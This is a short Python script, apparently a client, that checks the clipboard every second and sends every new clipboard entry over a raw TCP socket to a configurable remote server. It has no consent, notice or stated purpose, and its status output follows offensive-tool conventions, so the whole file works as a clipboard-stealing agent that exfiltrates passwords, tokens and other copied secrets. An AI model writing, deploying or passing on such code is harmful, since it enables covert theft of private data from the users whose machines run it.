import socket
import pyperclip
import time

# Client configuration
SERVER_HOST = 'server_ip_or_hostname'
SERVER_PORT = 12345

def send_clipboard_content():
    last_clipboard = ""

    while True:
        current_clipboard = pyperclip.paste()
        
        if current_clipboard != last_clipboard:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                    client_socket.connect((SERVER_HOST, SERVER_PORT))
                    client_socket.sendall(current_clipboard.encode('utf-8'))
                    print(f"[+] Sent clipboard content to server: {current_clipboard}")
            except Exception as e:
                print(f"[-] Error sending clipboard content: {e}")
            
            last_clipboard = current_clipboard
        
        time.sleep(1)  # Adjust the delay based on your needs

if __name__ == '__main__':
    send_clipboard_content()
